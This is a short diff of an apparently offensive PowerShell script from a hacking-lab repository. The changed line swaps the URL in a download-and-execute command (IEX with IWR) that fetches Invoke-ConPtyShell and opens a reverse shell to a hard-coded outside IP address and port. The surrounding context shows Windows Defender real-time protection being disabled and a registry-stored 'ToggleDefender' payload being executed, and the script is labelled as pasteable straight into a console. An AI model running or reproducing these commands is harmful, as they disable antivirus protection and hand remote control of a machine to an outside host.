@@ -112,6 +112,6 @@ rp ($wdp+'\Real-Time Protection') RealtimeScanDirection -Force -ea 0            
 
 ## Creating reverse shell
 ## Original link: https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
-IEX(IWR https://sebis.net/hack-tests/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 37.114.53.18 69
+IEX(IWR https://raw.githubusercontent.com/ItsSebis/HackLab/main/WindowsReverseShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 37.114.53.18 69
 '@ -Force -ea 0; iex((gp Registry::HKEY_Users\S-1-5-21*\Volatile* ToggleDefender -ea 0)[0].ToggleDefender)
 ##-_-# hybrid script, can be pasted directly into powershell console
